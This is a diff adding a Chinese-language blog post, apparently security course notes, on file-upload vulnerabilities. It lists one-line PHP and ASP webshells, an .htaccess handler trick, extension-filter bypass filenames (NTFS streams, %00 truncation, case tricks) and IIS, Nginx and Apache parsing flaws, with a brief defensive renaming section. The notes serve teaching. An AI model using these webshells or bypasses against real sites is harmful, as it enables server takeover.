@@ -1,0 +1,1221 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta name="keywords" content="文件上传, Evolyutsiya">
+    <meta name="description" content="WebShellshell管理操作系统，用户与内核交互的程序
+功能&amp;emsp;&amp;emsp;文件管理&amp;emsp;&amp;emsp;命令执行&amp;emsp;&amp;emsp;管理数据库
+分类&amp;emsp;&amp;emsp;大码：功能全面&amp;emsp;&amp;emsp;小码：功">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <title>文件上传 | Evolyutsiya</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+    <style type="text/css">
+        
+    </style>
+
+    <script src="/libs/jquery/jquery-2.2.0.min.js"></script>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+
+<body>
+
+<header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Evolyutsiya</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fa fa-navicon"></i></a>
+<ul class="right">
+    
+    <li class="hide-on-med-and-down">
+        <a href="/" class="waves-effect waves-light">
+            
+            <i class="fa fa-home"></i>
+            
+            <span>首页</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/tags" class="waves-effect waves-light">
+            
+            <i class="fa fa-tags"></i>
+            
+            <span>标签</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/categories" class="waves-effect waves-light">
+            
+            <i class="fa fa-bookmark"></i>
+            
+            <span>分类</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/archives" class="waves-effect waves-light">
+            
+            <i class="fa fa-archive"></i>
+            
+            <span>归档</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/about" class="waves-effect waves-light">
+            
+            <i class="fa fa-user-circle-o"></i>
+            
+            <span>关于</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/friends" class="waves-effect waves-light">
+            
+            <i class="fa fa-address-book"></i>
+            
+            <span>友情链接</span>
+        </a>
+    </li>
+    
+    <li>
+        <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+            <i id="searchIcon" class="fa fa-search" title="搜索"></i>
+        </a>
+    </li>
+</ul>
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Evolyutsiya</div>
+        <div class="logo-desc">
+            
+            不忘初心,方得始终
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li>
+            <a href="/" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-home"></i>
+                
+                首页
+            </a>
+        </li>
+        
+        <li>
+            <a href="/tags" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-tags"></i>
+                
+                标签
+            </a>
+        </li>
+        
+        <li>
+            <a href="/categories" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-bookmark"></i>
+                
+                分类
+            </a>
+        </li>
+        
+        <li>
+            <a href="/archives" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-archive"></i>
+                
+                归档
+            </a>
+        </li>
+        
+        <li>
+            <a href="/about" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-user-circle-o"></i>
+                
+                关于
+            </a>
+        </li>
+        
+        <li>
+            <a href="/friends" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-address-book"></i>
+                
+                友情链接
+            </a>
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/Evolyutsiya/Evolyutsiya.github.io" class="waves-effect waves-light" target="_blank">
+                <i class="fa fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/Evolyutsiya/Evolyutsiya.github.io" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+
+<script src="/libs/cryptojs/crypto-js.min.js"></script>
+<script>
+    (function() {
+        let pwd = '';
+        if (pwd && pwd.length > 0) {
+            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
+                alert('密码错误，将返回主页！');
+                location.href = '/';
+            }
+        }
+    })();
+</script>
+
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/21.jpg')">
+    <div class="container">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <div class="description center-align post-title">
+                        文件上传
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #toc-content .is-active-link::before {
+        background-color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 20px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/第九周/" target="_blank">
+                                <span class="chip bg-color">第九周</span>
+                            </a>
+                        
+                            <a href="/tags/文件上传/" target="_blank">
+                                <span class="chip bg-color">文件上传</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fa fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/i春秋/" class="post-category" target="_blank">
+                                i春秋
+                            </a>
+                        
+                            <a href="/categories/i春秋/文件上传/" class="post-category" target="_blank">
+                                文件上传
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                <div class="post-date info-break-policy">
+                    <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2019-09-22
+                </div>
+
+                
+                    
+                    <div class="info-break-policy">
+                        <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
+                        3.2k
+                    </div>
+                    
+
+                    
+                    <div class="info-break-policy">
+                        <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                        12 分
+                    </div>
+                    
+                
+				
+				
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="fa fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="WebShell"><a href="#WebShell" class="headerlink" title="WebShell"></a>WebShell</h1><p>shell管理操作系统，用户与内核交互的程序</p>
+<h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><p>&emsp;&emsp;文件管理<br>&emsp;&emsp;命令执行<br>&emsp;&emsp;管理数据库</p>
+<h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p>&emsp;&emsp;大码：功能全面<br>&emsp;&emsp;小码：功能单一，执行系统命令，通过后续的上传代码完成大码的功能</p>
+<h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><p>WebShell需要放在网站设置的目录当中，后缀需要是中间件可识别的脚本语言后缀，这个WebShell才能正常使用。使用时，先写网址，在后面加路径，以及文件名字</p>
+<h2 id="一句话"><a href="#一句话" class="headerlink" title="一句话"></a>一句话</h2><h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><pre><code>    &lt;?php @eval($_POST[1]);?&gt;
+    &lt;?php assert($_POST[1]);?&gt;
+    补充：
+        使用POST传输数据，是因为，日志不会记录上传得详细上传数据，便于隐藏。</code></pre><h3 id="ASP"><a href="#ASP" class="headerlink" title="ASP"></a>ASP</h3><pre><code>    &lt;%eval request(&quot;pass&quot;);%&gt;
+    补充：
+        asp中 &#39; 为注释</code></pre><h1 id="网站环境"><a href="#网站环境" class="headerlink" title="网站环境"></a>网站环境</h1><h2 id="分类-1"><a href="#分类-1" class="headerlink" title="分类"></a>分类</h2><h3 id="1。"><a href="#1。" class="headerlink" title="1。"></a>1。</h3><p>L/W + A + M/O/M/R + P （module）   Mysql/Oracle/Mongodb/Redist<br>L/W + N + M + P （fastcgi）<br>W + iis + Mysql + php-fpm （fastcgi）</p>
+<h3 id="2。"><a href="#2。" class="headerlink" title="2。"></a>2。</h3><p>L/W + Tomcat/Weblogic/Jboss + M/O/M/R + JSP/JSPX</p>
+<h3 id="3。"><a href="#3。" class="headerlink" title="3。"></a>3。</h3><p>W + iis + Mssql/Access + ASP/ASPX</p>
+<h4 id="以上三大类的特点"><a href="#以上三大类的特点" class="headerlink" title="以上三大类的特点"></a>以上三大类的特点</h4><p>客户端进行请求时，<a href="http://www.a.com/upload/404.php" target="_blank" rel="noopener">http://www.a.com/upload/404.php</a> 中间件（iis,apache,nginx,tomcat,weblogic,jboss）接受到请求，会进行解析，识别出要请求的路径以及文件名，如果文件后缀是中间件可识别的脚本语言后缀（php,asp,jsp…）就会调用对应的语言执行文件。如果文件后缀，不是中间件可识别的脚本语言后缀，就直接让客户端下载该文件。</p>
+<h3 id="4。"><a href="#4。" class="headerlink" title="4。"></a>4。</h3><p>L/W + N + Nodejs/go/python/ruby/… + Mysql/Sqlite/Orcale/Redis   没有WebShell</p>
+<h4 id="特点："><a href="#特点：" class="headerlink" title="特点："></a>特点：</h4><p>靠路由器的方式，进行解析请求。</p>
+<h1 id="文件上传原理"><a href="#文件上传原理" class="headerlink" title="文件上传原理"></a>文件上传原理</h1><pre><code>在文件上传的功能除，若服务端脚本语言未对上传得文件进行严格验证和过滤，导致恶意用户上传恶意的脚本文件时，就可能获取执行服务端命令的能力。
+文件上传漏洞是Web的一种高危漏洞，一般情况下Web应用都回允许用户上传一些文件，Eg：头像、附件等信息，如果应用没对用户上传文件进行有效过滤，那么恶意用户就会上传WebShell,获取网站控制权</code></pre><h2 id="文件上传的高危触发点"><a href="#文件上传的高危触发点" class="headerlink" title="文件上传的高危触发点"></a>文件上传的高危触发点</h2><p>相册、头像上传<br>视频、照片分享<br>附件上传（论坛发帖、邮箱）<br>文件管理器</p>
+<h2 id="FILES-全局变量"><a href="#FILES-全局变量" class="headerlink" title="$_FILES 全局变量"></a>$_FILES 全局变量</h2><p>服务器在拿到上传得文件数据后，会先将其存储为一个临时文件，由$_FILES这个全局变量调用。</p>
+<h3 id="FILES-的属性"><a href="#FILES-的属性" class="headerlink" title="$_FILES 的属性"></a>$_FILES 的属性</h3><p>type：上传文件的类型<br>name：上传文件名<br>size：上穿文件的大小<br>tmp_name：临时文件的保存位置</p>
+<h1 id="预防文件上传"><a href="#预防文件上传" class="headerlink" title="预防文件上传"></a>预防文件上传</h1><h2 id="前端"><a href="#前端" class="headerlink" title="前端"></a>前端</h2><p>js检测，但作用十分有限</p>
+<h2 id="后端"><a href="#后端" class="headerlink" title="后端"></a>后端</h2><p>1。MIME文件类型检测：可以通过抓包改包方式绕过<br>2。文件后缀检测：可以通过大小写，特殊后缀，截断等方式绕过<br>3。内容检测：可以通过PHP伪协议，利用文件特性数据加密等方式绕过</p>
+<h1 id="文件上传绕过导图"><a href="#文件上传绕过导图" class="headerlink" title="文件上传绕过导图"></a>文件上传绕过导图</h1><p><img src="/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/20190922124312228.png" alt></p>
+<h2 id="文件头检测"><a href="#文件头检测" class="headerlink" title="文件头检测"></a>文件头检测</h2><p>文件头，描述一个文件的一些重要的属性，比如图片的长度、宽度、像素尺寸等，当程序打开文件时读取这些属性对文件进行处理。</p>
+<h2 id="文件后缀检测"><a href="#文件后缀检测" class="headerlink" title="文件后缀检测"></a>文件后缀检测</h2><h3 id="后缀检测的两种方式"><a href="#后缀检测的两种方式" class="headerlink" title="后缀检测的两种方式"></a>后缀检测的两种方式</h3><p>1。黑名单：一般有个专门的Blacklist文件，包含常见的危险脚本文件<br>2。白名单：一般有一个专门的Whitelist文件，包含常见的正常文件。</p>
+<h4 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h4><pre><code>1．    .htaccess  利用的是apache的特性，让目录下的任意文件解析为php程序，可以通过改包方式，文件中需要添加代码
+        a)    启用 .htaccess 需要修改 httpd.conf 启动AllowOverride，并可以用AllowOverride限制特定命令的使用。如需使用 .htaccess 以外的其它文件名，可以使用AccessFileName指令来改变。
+                i.    AllowOverride All
+                    LoadModule rewrite_module modules/mod_rewrite.so
+                ii.    在apache中，如果网站目录下，存在一个.htaccess文件(必须.开头，名字是htaccess)，那么，apache就会优先解析次文件中的配置，如果我们设置一些参数，比如将名字中包含abc的文件当作php程序去执行。
+                    &lt;FilesMatch &quot;abc&quot;&gt;
+                    SetHandler application/x-httpd-php 
+                    &lt;/FilesMatch&gt;
+        b)    要考虑一个问题，必须是Windows系统。如果是在黑名单中，对上传文件进行重命名，不受影响
+        c〉                                  如果是在白名单中，对上传文件进行重命名，受影响不能使用
+2．    a.php::$DATA.jpg    利用windows系统特性。
+        a)    要考虑一个问题，只能在黑名单中进行攻击。并且，如果网站对上传的文件进行重命名，将无法利用
+3．    a.php:.jpg        windows特性， .jpg 会被截断，最后剩下a.php  文件为空
+4．    a.php.            windows特性， .不会被保存，最后剩下 a.php
+        a)    文件是否重命名没影响
+5．    a.php空格        windows特性， 空格不会被保存，最后剩下 a.php
+6．    a.PHP            windows特性， 系统不区分大小写，最后访问到 a.php
+7．    截断上传            php5.3.4以下，%00可以截断后缀，  /upload/a.php%00a.jpg  最后保存为 /upload/a.php
+8．    a.pphphp            程序内部，在识别黑名单后将内容替换为空（不常见）</code></pre><h4 id="白名单绕过"><a href="#白名单绕过" class="headerlink" title="白名单绕过"></a>白名单绕过</h4><pre><code>1。a.php::$DATA.jpg
+2。a.php:            文件最后为空</code></pre><h3 id="截断上传"><a href="#截断上传" class="headerlink" title="截断上传"></a>截断上传</h3><p>基于一个组合逻辑漏洞造成的，通过修改上传过程中的POST包，在文件名后添加 %00 字节，则可以截断某些函数对文件名的判断。因为在许多语言中 0x00 被认为是终止符。<br><strong>注意：PHP版本小于5.3.4 请关注 CVE-2006-7243</strong><br><strong>PHP的magic_quotes_gpc为OFF状态  //如果不修改长传可能无法成功，默认为ON</strong><br>如果需要进行截断上传，就需要指定文件保存路径，并且，文件保存路径回合文件名字进行连接，最后进行保存，保存时会把文件名截断，剩下的路径以及自定义的文件名。</p>
+<pre><code>        Eg：filepath=/upload/a.php%00
+            file=a.jpg
+            /upload/a.php%00a.jpg    /upload/a.php</code></pre><h4 id="截断上传理论上和实际操作中"><a href="#截断上传理论上和实际操作中" class="headerlink" title="截断上传理论上和实际操作中"></a>截断上传理论上和实际操作中</h4><pre><code>    理论上：
+        抓包： filename=”avatar.php%00.jpg”
+        Php：  $_FILES[‘file’][‘name’]=avatar.php%00.jpg
+        截断 .jpg
+        Whitelist中 [‘jpg’,’png’,’jpeg’] 存在通过
+        move_uploaded_file(“tmpfile”,”upload/”.name) 保存文件时截断
+        最终结果：    upload/a.php        保存为 a.php
+
+    现实中：
+        抓包：Filename=”avatar.php%00.jpg”
+        Php： $_FILES[‘file’][‘name’]=avatar.php%00.jpg
+        截断：    .jpg   剩下 avatar.php
+        Whitelist中不存在 php     阻止上传</code></pre><h5 id="截断上传实际操作中的运用"><a href="#截断上传实际操作中的运用" class="headerlink" title="截断上传实际操作中的运用"></a>截断上传实际操作中的运用</h5><p>上传时，可以指定<strong>文件保存路径</strong>，组合路径和文件名字时，路径中有 %00 把文件名字截断，留下路径中的 .php</p>
+<h6 id="大致的实现代码"><a href="#大致的实现代码" class="headerlink" title="大致的实现代码"></a>大致的实现代码</h6><pre><code>前段处理
+&lt;form action=up.php  method = post&gt;      
+
+    &lt;input type = file name = file&gt;      
+
+    &lt;input type = text name = path&gt;      
+
+    &lt;input type = submiit &gt;      
+
+&lt;/form&gt;
+
+后端处理
+&lt;?php  
+
+$path = $_POST[&#39;path&#39;]       
+
+$file = $_FILES[&#39;file&#39;]  
+
+$list = [&#39;jpg&#39;, &#39;jpeg&#39;, &#39;png&#39;]  
+
+ext  = $file[&#39;name&#39;] // 取文件后缀   .jpg  
+
+    if (ext in list) {}  // 通过白名单或者黑名单检测  
+
+    savepath = $path . $file[&#39;name&#39;]  // 文件保存路径  
+
+    move_uploaded_file(savepath, tmpfile) // 保存文件  
+
+?&gt;  </code></pre><h4 id="截断上传附录"><a href="#截断上传附录" class="headerlink" title="截断上传附录"></a>截断上传附录</h4><h5 id="命令行的方式合并两个文件"><a href="#命令行的方式合并两个文件" class="headerlink" title="命令行的方式合并两个文件"></a>命令行的方式合并两个文件</h5><p>Windows下使用copy将两个文件通过16进制方式合并成一个文件的方式</p>
+<pre><code>    Copy  文件1 /b + 文件2 /a 新文件名.类型        /b是16进制方式  /a ascii方式  将文件2写入到文件1中</code></pre><p>Linux下使用重定向即可</p>
+<pre><code>    Cat 404.php &gt;&gt; 1.png</code></pre><h5 id="NTFS-文件流"><a href="#NTFS-文件流" class="headerlink" title="NTFS 文件流"></a>NTFS 文件流</h5><p>NTFS文件留系统包括对备用数据流的支持。主要提供与文件系统中的文件的兼容性。常用数据流允许文件包含多个数据流。每个文件至少有一个数据流。在Windows中默认数据流称为 $DATA<br>Windows资源管理器不提供一种方法来检查文件中的备用数据流（或者在不删除文件的情况下删除它们），但可以轻松创建和访问它们。因为很难找到它们，经常被黑客利用，用来隐藏泄露的机器文件（rootkit的文件）。备用数据流中可执行文件，可以从命令行执行，但不会显示在windows资源管理器（或控制台）中。</p>
+<table>
+<thead>
+<tr>
+<th>上传文件名</th>
+<th>服务器生成的文件表面现象</th>
+<th>生成文件内容</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Test.php:a.jpg</td>
+<td>Test.php</td>
+<td>空</td>
+</tr>
+<tr>
+<td>Test.php::$DATA</td>
+<td>Test.php</td>
+<td><?php phpinfo();?></td>
+</tr>
+<tr>
+<td>Test.php::$INDEX_ALLOCATION</td>
+<td>Test.php文件夹</td>
+<td></td>
+</tr>
+<tr>
+<td>Test.php::$DATA.jpg</td>
+<td>0.jpg</td>
+<td><?php phpinfo();?></td>
+</tr>
+<tr>
+<td>Test.php::$DATA\aaa.jpg</td>
+<td>aaa.jpg</td>
+<td><?php phpinfo();?></td>
+</tr>
+</tbody></table>
+<h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><pre><code>    中间件 apache不区分大小写，根据配置文件识别是否是可执行脚本文件。
+        // 判断是否是可执行脚本时不区分大小写， .php  .Php  .PHP  .PHp … 全部是可执行脚本
+    去操作系统中找文件，执行里面的代码
+        // 根据操作系统，Linux区分大小写，Windows不区分大小写
+
+    Eg：上传一个 .Php
+        在Linux和Windows都可以用
+        在Windows中，可以直接访问 .Php或者 .php, .pHp …
+        在Linux中，只可以访问 .Php</code></pre><h3 id="关于上传图片裁剪功能"><a href="#关于上传图片裁剪功能" class="headerlink" title="关于上传图片裁剪功能"></a>关于上传图片裁剪功能</h3><pre><code>    客户端：
+        使用JS，裁剪图片，把裁剪后的图片发送到服务器
+            可以通过抓包改包的方式，将上传得图片码进行编码写入webshell，再编码上传
+                特点：将裁剪好的图片通过数据包的方式发送给服务器
+    服务端：
+        客户端选择图片的坐标，发送坐标到服务器，服务器根据坐标进行裁剪
+            可以通过强制刷新的方式，跳过裁剪。    
+                特点：选择图片后直接上传。
+</code></pre><h2 id="网站服务端，常用的重命名方式（防御恶意上传）"><a href="#网站服务端，常用的重命名方式（防御恶意上传）" class="headerlink" title="网站服务端，常用的重命名方式（防御恶意上传）"></a>网站服务端，常用的重命名方式（防御恶意上传）</h2><p>1。生成一个时间戳 + 文件名<br>&emsp;&emsp;a.jpg  ==&gt;   123456_a.jpg<br>2。生成一个时间戳 + 文件后缀<br>&emsp;&emsp;a.jpg  ==&gt;   123456.jpg<br>&emsp;&emsp;a.png  ==&gt;   123456.png<br>3。生成一个时间戳 + 固定的后缀<br>&emsp;&emsp;a.jpg  ==&gt;   123456.jpg<br>&emsp;&emsp;a.png/gif/mp3  ==&gt;   123456.jpg<br>4。其他方式</p>
+<h2 id="文件上传解析漏洞"><a href="#文件上传解析漏洞" class="headerlink" title="文件上传解析漏洞"></a>文件上传解析漏洞</h2><p><img src="/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/20190922021828182.png" alt></p>
+<pre><code>1．    Iis
+        a)    iis5.x —— iis6.x 
+                i.    目录解析： /xx.asp/xx.jpg 可替换为任意文本文件（eg： xx.txt） 文本内容为后门木马。
+                        1.    原理：服务器默认会把xx.asp目录下的文件解析为 asp文件
+                ii.    文件解析： /xx.asp;.jpg  形如 www.xxx.com/xx.asp;.jpg
+                        1.    原理：服务器默认不解析 ; 后面的内容，因此 xx.asp;.jpg 便解析成了asp文件
+        b)    Iis7.5解析漏洞
+                i.    原理：类似于nginx，都是由于php配置文件中，开启了 cgi.fix_pathinfo=1 这严格意义上不是nginx或者iis7.5本身的漏洞。
+                ii.    漏洞形式：www.xxx.com/uploadfiles/image/1.jpg/1.php
+2．    Nginx
+        a)    漏洞原理：Nginx拿到文件路径（URI） /test.jpg/test.php 后，后缀是php就认为是php文件，交给php处理。因为 test.php不存在删除，test.jpg存在，便把test.jpg当作php文件执行。
+                i.    该选项需要：cgi.fix_pathinfo=1 默认开启，php可以对文件路径进行修理。
+        b)    漏洞形式：www.xxx.com/uploadfiles/image/1.jpg/.php  因为 .php 文件不存在会删除，但会把1.jpg当作php处理。
+        c)    另外的两种漏洞形式
+                i.    www.xxx.com/uploadfile/image/1.jpg%00.php
+                ii.    www.xxx.com/uploadfile/image/1.jpg/%20\0.php
+3．    Apache
+        a)    Apache 1.x 2.x 解析漏洞
+                i.    原理：Apache解析文件的规则是从右向左判断解析，如果后缀名为不可识别文件解析，就再往左判断。
+                ii.    漏洞的形式：www.test.com/test.php.a    a不能解析，在php可以解析
+                iii.    配置问题导致的漏洞：
+                        1.    如果在Apache的conf里配置 AddHandler php5-script.php 这时只要文件名里包含 .php 即时文件名是test2.php.jpg 也会以php来执行
+                        2.    如果在Apache的conf里配置 AddType application/x-http-php .jpg 即时扩展名是 jpg 一样以 php方式执行</code></pre><p>补充</p>
+<pre><code>Iis解析asp   iis6  a.asp/a.jpg        a.asp;.jpg  可以绕过黑名单
+Apache解析php  1.x — 2.2.x  从右向左解析        a.php.abc    不能绕过黑名单
+Nginx/lighttpd/iis  解析php        a.jpg/.php  默认可以绕过黑名单    因为，cgi模式运行，中间识别到php程序后，直接将请求转发给php，由于默认开启 cgi.fix_pathinfo=1
+Nginx &lt;= 0.8.37  存在截断漏洞    a.jpg%00.php
+Nginx识别为php程序后，转发给cgi的php 00截断，php收到a.jpg 执行a.jpg</code></pre>
+            </div>
+            <hr/>
+
+            
+            <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.88rem;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-large waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fa fa-close"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
